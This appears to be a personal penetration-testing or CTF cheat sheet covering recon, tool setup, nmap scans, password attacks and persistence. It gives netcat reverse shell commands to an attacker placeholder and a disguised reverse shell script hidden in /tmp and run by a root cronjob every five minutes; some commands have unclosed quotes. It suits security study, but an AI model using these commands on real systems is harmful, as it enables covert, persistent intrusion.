## Basic Recon
Congrats! You have a computer! What now?
* Your computer should have internet reachability. Try pinging google.com. If that does not work, try pinging 8.8.8.8. This will show if your DNS resolution is broken, or if you really dont have internet reachability
* You can reach the internet!
	* ```ip a``` - run to check ip address and subnet. Once you have your subnet, ping the whole thing to see what is up and active! //Note, use SYN requests instead of ping incase ICMP is disabled, but ultimately use both
	* ```ipconfig /all``` - run to check same thing in Windows (gross)
* Check running services
	* netstat is your best friend here
* Check what drives are on your computer and what shares there might be
	* /dev/ or check in file explorer in windows
	* 
## Setting up the Computer
With a fancy little computer, there are a few things you want to install to make life easier. Kali has most of the good tools, but here are a few and how to install:
1. `sudo apt update` - update repos before installing stuff
2. `sudo apt upgrade` - optional, good if its your system. Meh if its a system given to you for competition
3. `sudo apt install screen` - definitely a must, will make life so much easier. Unless you feel like spending 8 hours staring at an nmap running. See the screen section for common commands.
4. `sudo apt install john` - install john the ripper
5. `sudo apt install nmap` - the lovely nmap tool
6. `sudo apt install pipx git` - install NetExec
	1. `pipx ensurepath`
	2. `pipx install git+https://github.com/Pennyw0rth/NetExec` 
	3. If on Kali - `apt update && apt install netexec`
7. `cd ~/` - double check you're in your home directory
8. `mkdir reports && cd reports`
9. `mkdir nmap screenshots other `
10. `sudo apt install python3`
11. `sudo apt install python3-pip`
13. `sudo apt install seclists curl dnsrecon enum4linux feroxbuster gobuster impacket-scripts nbtscan nikto nmap onesixtyone oscanner redis-tools smbclient smbmap snmp sslscan sipvicious tnscmd10g whatweb wkhtmltopdf`
14. `pipx install git+https://github.com/Tib3rius/AutoRecon.git`
15. `pipx upgrade autorecon`
16. 
## Quick Start Guide
Your intro to breaking in.
### Checking History
* Once you have basic access to a machine, check the history. See when the machine (think VM for CTFs) was created and what was installed. Specifically check for what was installed, as this will help tell you what critical services might be running. Lots of good Easter Eggs to find here
* Check the local firewall rules, arp tables, ip tables, VPNs, etc to define critical infrastructure. If there is an allow all rule to an IP, chances are that IP is critical
### Checking for Quick CVEs
* It is imperative that you go for low hanging fruit! There tends to be a decent amount, since updating is scary. The more I work and talk with people in the industry, the more I learn about companies running Windows 7 or other deprecated software. 
## Tools!
Just like good soup, good scripts are pretty simple and make your life that much better. The following are scripts that desire to be like a good chicken noodle, simple but effective.
### Check History
```check history``` 
### Autosave screenshots to folder
`gnome-screenshot -f ~/reports/screenshots/<photo.png>` - Linux
On Windows, there is no easy way to change it. Just save it manually to \reports\screenshots
### Nmap!!
* Destination should be ~/reports/nmap/*filename*
* ip range is the range of your subnet in CIDR notation. Can be found with ip a. Use a specific IP if you only want a specific IP tested.

```
//Find whos alive and running
sudo nmap -sn <ip range> //basic ping scan

sudo nmap -sS -Pn <ip range> --open -oG destination/range.nmap -T4 | grep "open" | awk '{print $1} > destination/ips.txt //SYN scan, not ping

nmap -Pn -p- <ip range> //ALL ports, use screen
```
### Screen
Screen is used to split terminals, so you can run processes in the background and check on them later
* Not code, but use Ctrl+A and then press D to push a screen to the background\
* Ctrl+A then C to open a new screen while a command is running
* Ctrl+A then " to view all running screens
* `screen -S <screen-name>` - use to create a screen and name it for convenience
* `screen -ls` - lists the screens running and their PID
* `screen -r <PID>` - use the PID to pull the screen to the foreground
* `exit` - use to close out a screen

### Grep
Grep is how you filter results, so it is key to understand how to use it. Some regex is great too, to help with simplifying your needs. 
`grep -oP 'Host: \K\S+ results.nmap > ips.txt`  - use this to grep IPs out of the nmap result
### Autorecon
Autorecon is a great tool, check the usage at https://github.com/Tib3rius/AutoRecon
### Repeater/Responder
Tool used for ntlm hashes, aka windows hashes. Google it. 
### Tmux
### Impacket-scripts
### RPC Client

### Windows Tools
runas is a windows command that sometimes allows you to run as a user that you do not have access to. Very handy for privilege escalation.

## Setting Up Persistence
What is persistence and why do we want it?
- Persistence is the ability to stay connected to a machine. Getting access is cool, but maintaining that access is what matters. Using a reverse shell is the best way to maintain this persistence.
#### What is a Reverse Shell?
A reverse shell is when you make the server or computer you are exploiting, connect back to your computer instead of your computer connecting to it. Because most firewalls are set to block incoming connections, this reverse shell avoids firewall detection. It also means that if the firewall detects your intrusion and blocks it, the exploited machine will re-establish that connection automatically! How nice.
* Ligolo-ng is the software I know of to establish a reverse tunnel. It uses a tun interface, avoiding the need of SOCKS.
* Netcat is a great tool for creating a reverse shell
	* Basic steps:
		1. Start listening on a port on the attacker
			`nc -nvlp 4040` 
		2. Connect from target machine to attacker
			`nc -v <attacker ip> 4040 -e cmd.exe` - Windows attacker
			`/bin/sh | nc <attacker ip> 4040 ` - Linux attacker
* Use cronjobs for increased persistence!

## Passwords - All about them!
Passwords are those lovely things that allow us to create more secure systems, or exploit vulnerable systems. All depends on password strength, encryption, and hashing.
### Info Gathering
#### Check Password Strength and Requirements
In Linux and Windows, users have a password requirement that they must meet. Check these requirements. If the requirements are too high, maybe try other avenues of exploitation.
### Password Sprays
Once you have the password for one user, spray it to other hosts to see what works!
### Password Cracking
The lovely world of defeating the hash; password cracking is best done with a good GPU and weak hash. Rainbow tables are your best friend here. Ultimately if the password is weak, it doesn't matter the hash. John the ripper or hashcat are your best tools here.


## Scripts
`cd /tmp`
`mkdir system_status` - use this for all of your files to be kept hidden
`cd system_status`
`nano system_connection.sh` - this will be your reverse shell
```
#!/bin/bash
if ! netstat -an | grep -q '<ip:4040*ESTABLISHED>'; then
	/bin/bash | nc <ip> 4040
fi
```
`sudo chmod a+x system_connection.sh` - allow it to run
```
crontab -e
*/5 * * * * root /tmp/system_status/system_connection.sh
```

## Online Resources
List of resources to use to find CVEs and other known exploits:
* https://exploits.shodan.io/welcome
* https://nvd.nist.gov/vuln/search
* ippsec is a great youtuber and online source of info
* searchsploit or exploitdb
* whatweb - used to check IPs for certain exploits and stuff
* Godpotato - learn to use this for Windows/AD

## Other Notes
* Use resolv.conf to add a DC to your DNS for local names
* IPC can be used to enumerate all users if you have READ permissions
* learn certipy
* 